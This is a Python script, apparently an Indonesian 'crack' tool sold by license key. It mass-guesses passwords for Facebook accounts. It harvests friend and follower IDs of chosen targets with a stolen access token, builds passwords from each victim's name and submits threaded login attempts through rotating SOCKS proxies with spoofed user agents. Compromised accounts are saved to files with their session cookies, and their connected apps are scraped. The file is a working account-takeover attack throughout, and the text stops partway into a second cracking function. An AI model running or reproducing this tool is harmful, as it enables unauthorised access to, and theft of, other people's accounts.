# jalan_jalan
def basari_tamvan(basjalan):
        for kontol in basjalan + "\n":sys.stdout.write(kontol);sys.stdout.flush();time.sleep(0.05)
        
# kembali
def back():
	bass()
	
# clear_layar
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
		
# import,global_name,apend,prox,ugent
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
import zlib
import subprocess
import base64
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
babas = Console()
pwt = []
pwn = []
id,id2 = [],[]
uid = []
ualu = []
ualuh = []
ugenm = []
ugenb = []
ugenf = []
ugenz = []
ugenz2 = []
aplikasi = []
ok,cp = 0,0
loop = 0
akun = []
basari = []
tokenku = []
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('><')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='10; SM-G970F)'
        e=random.randrange(100, 9999)
        f='AppleWebKit/537.36 (KHTML, like Gecko)'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Chrome/75.0.3396.81 Mobile Safari/537.36'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugenz2.append(uaku)

        oi='Mozilla/5.0 (Linux; Android'
        ba=random.choice(['7.0','8.1.0','9','10'])
        sa=random.choice(['Redmi Note 5)','Mi 9T Pro)','MI 8 SE)'])
        ri=random.choice(['AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/83.0.316 Mobile Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/83.0.258 Mobile Chrome/'])
        ta=random.randrange(80,103)
        mv='0'
        an=random.randrange(4200,4900)
        u=random.randrange(40,150)
        y='Mobile Safari/537.36'
        uabas=f'{oi} {ba}; {sa} {ri}{ta}.{mv}.{an}.{u} {y}'
        ugenm.append(uabas)
        
        oi='Mozilla/5.0 (Linux; Android'
        ba=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
        sa=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C)','Samsung Galaxy Note 9 Build/SM-N960N)'])
        ri='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
        ta=random.randrange(80,103)
        mv='0'
        an=random.randrange(4200,4900)
        u=random.randrange(40,150)
        y='Mobile Safari/537.36'
        uabas=f'{oi} {ba}; {sa} {ri}{ta}.{mv}.{an}.{u} {y}'
        ugenf.append(uabas)
        
        oi='Mozilla/5.0 (Linux; Android'
        ba=random.choice(['7.0','8.1.0','9','10'])
        sa=random.choice(['SM-G965U)','Nokia X7)','vivo 1916)'])
        ri=random.choice(['AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/83.0.250 Mobile Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/83.0.300 Mobile Chrome/'])
        ta=random.randrange(80,103)
        mv='0'
        an=random.randrange(4200,4900)
        u=random.randrange(40,150)
        y='Mobile Safari/537.36'
        uabas=f'{oi} {ba}; {sa} {ri}{ta}.{mv}.{an}.{u} {y}'
        ugenz.append(uabas)
        
# pewarna
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
bas = '\033[41m\x1b[1;97m'
try:
	warna_kolor = "#00C8FF"
except FileNotFoundError:
	warna_kolor = "#00C8FF"

# tahun_akun
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
# convert,t,b,t
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'


# premium
def lisensi():
	os.system('clear')
	banner()
	print(f'{bv}[!] Masukkan Nama Kamu Dan Lisensi')
	nama = input(f'[>] nama : ');open('.nama.json','w').write(nama)
	api = input(f'[>] lisen : ')
	if api =="":
		basari_tamvan(f'└── harap masukan dengan benar')
		author()
	if api not in ('AKSQ-ZHNI-QRXT-OKAQ-PQNS','PNQK-TAHW-BAMA-ZXCW-AKMQ',"BANS-UQJW-YXAU-OAJW-PAJW"):
		basari_tamvan(f'└── lisensi tidak valid ')
		time.sleep(1)
		author()
	else:
		basari_tamvan(f'└── lesensi valid ')
		time.sleep(1)
		
def author():
	basari_tamvan(f'{bv}└── anda akan diarahkan ke fb untuk membeli lisensi  {x}')
	time.sleep(1)
	os.system("xdg-open https://www.facebook.com/basari.shp")
	lisensi()

		
# banner_menu
def banner():
	cetak(panel(f"""\t    [bold cyan]______  ___   _________  _______________ 
\t    [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
\t    [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
\t    [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
\t    [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
\t    [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
                   """,width=70,title=f"",subtitle=f"[bold cyan] 2.2 [/]",style=f"{warna_kolor}"))

# banner_login
def banner2():
	cetak(panel(f"""\t       [bold cyan]_      ____   _____ _____ _   _ 
\t     [bold cyan] | |    / __ \ / ____|_   _| \ | |
\t     [bold cyan] | |   | |  | | |  __  | | |  \| |
\t     [bold cyan] | |   | |  | | | |_ | | | | . ` |
\t     [bold cyan] | |___| |__| | |__| |_| |_| |\  |
\t     [bold cyan] |______\____/ \_____|_____|_| \_|
                   """,width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))

# login
def bass():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			basganteng = json.loads(basariheker.text)['id']
			menu(basganteng)
		except KeyError:
			login_bas()
		except requests.exceptions.ConnectionError:
			basari_tamvan(f'{bas}[!] JARINGAN EROR BRO COBA LAGI !{x}')
			exit()
	except IOError:
		login_bas()

		
def login_bas():
	try:
		os.system('clear')
		banner2()
		ses = requests.Session()
		cookie=input(f'{bv}└── Cookies :{x}{H} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ken = open(".baztoken.txt", "w").write(tok)
		cok = open(".bazcok.txt", "w").write(cookie)
		basari_tamvan(f'{x}{bv}└── Berhasil Login{x} ')
		time.sleep(1)
		exit()
	except Exception as e:
		os.system('rm -rf .bazcok.txt && rm -rf .baztoken.txt')
		basari_tamvan(f'{x}{bv}└── Login Gagal ! Login Ulang Ganti Cookes !{x} ')
		time.sleep(1)
		exit()

#menunya
def menu(id):
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
		nama = open('.nama.json','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		login_bas()
	os.system('clear')
	banner()
	iplu = requests.get("https://api.ipify.org").text
	gpp = []
	ghku = 'Basari-ID'
	gpp.append(panel(f'[cyan]Namamu   : {nama}\nUserIp   : {iplu}\nStatus   : Premium',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
	gpp.append(panel(f'[cyan]Author   : Muh Basari\nGithub   : {ghku}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
	babas.print(Columns(gpp))
	cetak(panel(f'\t                  [bold cyan]Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Crack Publik Massal\n [cyan]02. Crack Followers\n [cyan]03. [cyan]Hasil Crack Akun\n [cyan]04. Gabung Grup Wa\n [cyan]05. Lapor Bug Sc\n [cyan]00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
	______muhammad______basari______ = input(f'{bv}Pilih : ')
	if ______muhammad______basari______ in ['01','1']:
		dump_massal()
	elif ______muhammad______basari______ in ['02','2']:
		dump_pengikut()
	elif ______muhammad______basari______ in ['03','3']:
		hasil()
	elif ______muhammad______basari______ in ['04','4']:
		gabung_grup()
	elif ______muhammad______basari______ in ['05','5']:
		authorbas()
	elif ______muhammad______basari______ in ['00','0']:
		os.system('rm -rf .bazcok.txt && rm -rf .baztoken.txt')
		basari_tamvan(f'└── Sukses Logout{x} ')
		time.sleep(4)
		exit()
	else:
		basari_tamvan(f'└── Pilih Yang Bener')
		time.sleep(4)
		back()
def authorbas():
	basari_tamvan(f'└── Tunggu Sebentar Nanti Diarahin Ke Facebook  {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/basari.shp")
	back()
def gabung_grup():
	basari_tamvan(f'└── Tunggu Sebentar Nanti Diarahin Ke WhatsApp  {x}')
	time.sleep(4)
	os.system("xdg-open https://chat.whatsapp.com/Gi7RgNUhVvS4EcV7oL6WSw")
	back()
	
# cek_hasil
def hasil():
	cetak(panel(f'\t                  [bold cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Akun OK\n [cyan]02. Akun CP\n [cyan]03. Kembali',width=70,title=f"",style=f"{warna_kolor}"))
	baz_code = input(f'{bv}Pilih : ')
	if baz_code in ['2']:
		try:bass = os.listdir('CP')
		except FileNotFoundError:
			basari_tamvan('[!] File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(bass)==0:
			basari_tamvan('[!] Tidak Ada Hasil CP ')
			time.sleep(4)
			back()
		else:
			bokep = 0
			indo = {}
			for isi in bass:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				bokep+=1
				if bokep<10:
					nom = ''+str(bokep)
					indo.update({str(bokep):str(isi)})
					indo.update({nom:str(isi)})
					print(f'{x}[!] %s. %s ({k} %s {x}Id )'%(nom,isi,len(hem)))
				else:
					indo.update({str(bokep):str(isi)})
					print('['+str(bokep)+'] '+isi+' [ '+str(len(hem))+' Akun ]'+x)
			geeh = input('[?] Pilih : ')
			try:geh = indo[geeh]
			except KeyError:
				basari_tamvan('[!] Pilih Yang Bener Cuk ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				basari_tamvan('[!] File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}[!] {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['1']:
		try:bass = os.listdir('OK')
		except FileNotFoundError:
			basari_tamvan('[!] File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(bass)==0:
			basari_tamvan('[!] Tidak Ada Hasil OK ')
			time.sleep(4)
			back()
		else:
			bokep = 0
			indo = {}
			for isi in bass:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				bokep+=1
				if bokep<10:
					nom = '0'+str(bokep)
					indo.update({str(bokep):str(isi)})
					indo.update({nom:str(isi)})
					print(f'{x}[!] %s. %s ( {h}%s{x} Id )'%(nom,isi,len(hem)))
				else:
					indo.update({str(bokep):str(isi)})
					print(f'{x}[!] %s. %s ({h} %s {x}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = indo[geeh]
			except KeyError:
				basari_tamvan('[!] Pilih Yang Bener Lah ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				basari_tamvan('[!] File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}[!] {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['3']:
		back()
	else:
		basari_tamvan('[!] Pilih Yang Bener Lah ')
		back()

# crack_pengikut
def dump_pengikut():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	cetak(panel(f' [cyan]Masukkan Idz Target',width=70,title=f"",style=f"{warna_kolor}"))
	pil = input(f'{bv}Idz : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'{bv}Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		basari_tamvan(f'[!]{bas} Koneksi Bermasalah {x}')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		basari_tamvan(f'[!]{bas} Gagal mengambil Id target {x}')
		time.sleep(4)
		back()

# crack_id_masal
def dump_massal():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	try:
		cetak(panel(f' [cyan]Mau Berapa Idz Target',width=70,title=f"",style=f"{warna_kolor}"))
		baz_coder = int(input(f'{bv}Pilih : '))
	except ValueError:
		basari_tamvan('[!] Yang Bener Napa Cuk ')
		time.sleep(4)
		exit()
	if baz_coder<1 or baz_coder>100:
		basari_tamvan('[!] Gagal Dump Id Target ')
		time.sleep(5)
		exit()
	ses=requests.Session()
	baz = 0
	for met in range(baz_coder):
		baz+=1
		cetak(panel(f' [cyan]Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
		bazfaa = input(f'{bv}Idz '+str(baz)+' : ')
		uid.append(bazfaa)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			basari_tamvan('[!] Sinyal Lu Eror ')
			exit()
	try:
		print(f'{bv}Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		basari_tamvan(f'{bas}[!] Koneksi Lu Eror Cuk{x} ')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		basari_tamvan(f'[!]{bas} Pertemanan Id Target Lu Tidak Publik {x}')
		time.sleep(4)
		back()
	
# atur_sebelum_krek
def setting():
	cetak(panel(f'\t                  [bold cyan] Setting Idz',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Akun Lama\n [cyan]02. Akun Baru\n [cyan]03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
	__baz__gege__ = input(f'{bv}Pilih : ')
	if __baz__gege__ in ['1','01']:
		for lama in sorted(id):
			id2.append(lama)
			
	elif __baz__gege__ in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
			
	elif __baz__gege__ in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		basari_tamvan('[!] Pilih Yang Bener Cuukk')
		exit()
		
	cetak(panel(f'\t                  [bold cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Mobile Asyncvv\n [cyan]02. Mbasic Asyncvv\n 03. [cyan]Mobile Validate\n 04. [cyan]Mbasic Validate',width=70,title=f"",style=f"{warna_kolor}"))
	____method_crack____ = input(f'{bv}Pilih : ')
	if ____method_crack____ in ['1','01']:
		basari.append('m.facebook')
	elif ____method_crack____ in ['']:
		basari_tamvan(f'{bas}Pilih Yang Bener ')
		setting()
	elif ____method_crack____ in ['2','02']:
		basari.append('b.facebook')
	elif ____method_crack____ in ['3','03']:
		basari.append('f.facebook')
	elif ____method_crack____ in ['4','04']:
		basari.append('z.facebook')
	else:
		basari.append('m.facebook')
		
	cetak(panel(f' [cyan]Ingin Menampilkan Aplikasi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	_bas_cuy_ = input(f'{bv}Pilih : ')
	if _bas_cuy_ in ['']:
		basari_tamvan('[!] Pilih Yang Bener Cuukk')
		back()
	elif _bas_cuy_ in ['y','Y']:
		aplikasi.append('ya')
	else:
		aplikasi.append('no')
		
	cetak(panel(f' [cyan]Ingin Menambahkan Kata Sandi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	pwtambah=input(f'{bv}Pilih : ')
	if pwtambah in ['y','Y']:
		pwt.append('ya')
		cetak(panel(f' [cyan]Gunakan Koma Untuk Pemisah\n Contoh : sayang,kamu,lovyu',width=70,title=f"",style=f"{warna_kolor}"))
		pwku=input(f'{bv}└── Sandi :{x}{M} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwn.append(xpw)
	else:
		pwt.append('no')
		
	cetak(panel(f' [cyan]Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	uat = input(f'{bv}Pilih : ')
	if uat in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bz = input(f'{bv}└── Ugent :{x}{M} ')
		ualu.append(bz)
	else:
		ualuh.append('no')
	wordlist()
	
#bagian_wordlist
def wordlist():
	global prog,des
	cetak(panel(f'       [white]Hasil [green]OK[white] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f'       [white]Hasil [yellow]CP[white] Tersimpan Di : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f'    [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
	print('')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'm.facebook' in basari:
					pool.submit(crackm,idf,pwv)
				elif 'b.facebook' in basari:
					pool.submit(crackb,idf,pwv)
				elif 'f.facebook' in basari:
					pool.submit(crackf,idf,pwv)
				elif 'z.facebook' in basari:
					pool.submit(crackz,idf,pwv)
				else:
					pool.submit(crackz,idf,pwv)
		print('')
		print(f'{x}AKUN OK : {h}%s '%(ok))
		print(f'{x}AKUN CP : {k}%s{x} '%(cp))
		print('')
# async
def crackm(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[cyan]async[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenm)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=9af15271c748d378ef8bc2b720b79e63&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36"}
				if 'no' in aplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in aplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold green]APLIKASI MASIH AKTIF [/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow]APLIKASI KADALUARSA [/bold red]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					oke = f'[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{infoakun}[/]'
					oke2 = panel(oke, style='green')
					cetak(panel(oke2, title='[bold green]BAZ OK[/bold green]'))
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
# async 2
def crackb(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[cyan]async[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
